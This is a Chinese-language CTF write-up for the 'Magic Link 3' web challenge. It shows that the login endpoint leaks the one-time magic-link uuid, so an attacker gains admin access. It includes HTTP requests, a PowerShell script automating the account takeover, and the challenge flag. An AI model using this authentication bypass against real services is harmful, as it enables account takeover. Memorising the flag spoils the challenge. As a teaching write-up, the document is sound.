# Magic Link 3

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：https://bluehens-magic-link.chals.io/
- 核心漏洞：Magic link 的一次性 `uuid` 直接在 `/login` 响应里返回，随后可通过 `/login/<uuid>` 直接换取管理员登录态

## 入口与现象

前两层已经能确认三件事：

- `robots.txt` 暗示了 `/.env`、`/inbox`、`/dashboard`
- `/.env` 泄露了 Teddy 的 token 和管理员邮箱
- `/inbox` 里还能看到真正的 magic link

继续盯登录流程本身，会发现首页表单把邮箱直接提交到 `/login`：

```html
<form id="magic-link-form">
  <input type="email" name="email" placeholder="Enter Email" required>
  <button type="submit">Send Magic Link</button>
</form>
```

向管理员邮箱提交后，返回 JSON：

```json
{
  "datetime": "2026-04-18T09:53:46.970346+00:00",
  "email": "admin@udctf.com",
  "ip-address": "10.1.0.20",
  "message": "Magic link generated, check your email.",
  "uuid": "NHfaAN3pn9mvsXjAfR138g"
}
```

这里已经把最关键的东西暴露出来了：后端把本应只出现在邮件里的 magic link `uuid` 直接回给了前端。

## 分析过程

### 1. `/login/<uuid>` 就是真正的登录链接

拿到管理员的 `uuid` 后，直接访问：

```http
GET /login/NHfaAN3pn9mvsXjAfR138g HTTP/1.1
Host: bluehens-magic-link.chals.io
```

服务端返回：

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=...; HttpOnly; Path=/
```

说明这个路径段就是 magic link 的消费端点，而且会直接下发已登录 session。

### 2. 带 session 访问 `/dashboard`

我在 2026-04-18 的顺序复现实测中，管理员会话访问 `/dashboard` 后返回：

```html
<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
```

这就是第三层 flag。

## 利用过程

1. 向 `/login` 提交 `admin@udctf.com`。
2. 从 JSON 响应里读取一次性 `uuid`。
3. 访问 `/login/<uuid>`，让服务端设置管理员 session。
4. 带着该 session 访问 `/dashboard`，读取第三层 flag。

## 关键 payload / 命令

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$login = Invoke-RestMethod -Method Post -Uri 'https://bluehens-magic-link.chals.io/login' -Form @{ email = 'admin@udctf.com' }
$uuid = $login.uuid
try {
    Invoke-WebRequest -Uri ("https://bluehens-magic-link.chals.io/login/" + $uuid) -WebSession $s -MaximumRedirection 0 -ErrorAction Stop | Out-Null
} catch {
    if ($_.Exception.Response.StatusCode.value__ -notin 301,302,303,307,308) { throw }
}
$dash = Invoke-WebRequest -Uri 'https://bluehens-magic-link.chals.io/dashboard' -WebSession $s
$dash.Content
```

关键输出：

```html
<h1>Welcome Admin</h1><p>Flag: udctf{y0u_4r3_m4g1c_l1nk_m4st3r}</p>
```

## Flag

```text
udctf{y0u_4r3_m4g1c_l1nk_m4st3r}
```

## 总结

第三层的核心问题是 magic link 设计彻底失效了。服务端不仅生成了登录链接，还把其中最敏感的 `uuid` 原样回给前端，导致攻击者根本不需要读邮件，直接就能伪造管理员登录并进入后台拿到最终 flag。
